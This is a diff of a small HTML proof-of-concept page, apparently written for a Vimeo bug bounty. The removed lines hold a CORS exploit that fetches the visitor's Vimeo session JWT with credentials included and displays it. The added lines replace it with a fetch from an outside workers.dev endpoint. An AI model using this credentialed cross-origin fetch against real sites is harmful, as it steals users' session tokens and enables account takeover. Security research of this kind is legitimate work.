@@ -1,22 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Vimeo JWT PoC</title>
+  <meta charset="UTF-8">
+  <title>Vimeo Bug Bounty Test</title>
 </head>
 <body>
-    <h1>Vimeo JWT CORS PoC</h1>
-    <p>Open the browser console to see the token.</p>
-    <script>
-        fetch("https://vimeo.com/_next/jwt", {
-            credentials: "include"
-        })
-        .then(response => response.text())
-        .then(token => {
-            console.log("Vimeo JWT:", token);
-            document.body.insertAdjacentHTML('beforeend', `<pre>${token}</pre>`);
-        })
-        .catch(err => console.error("Error fetching token:", err));
-    </script>
+  <h1>Vimeo Bug Bounty Test</h1>
+  <pre id="output">Loading...</pre>
+
+  <script>
+    fetch('https://workers-playground-long-sky-3466.okarijob56.workers.dev/my-test')
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+      })
+      .catch(err => {
+        document.getElementById('output').textContent = 'Error: ' + err;
+      });
+  </script>
 </body>
 </html>
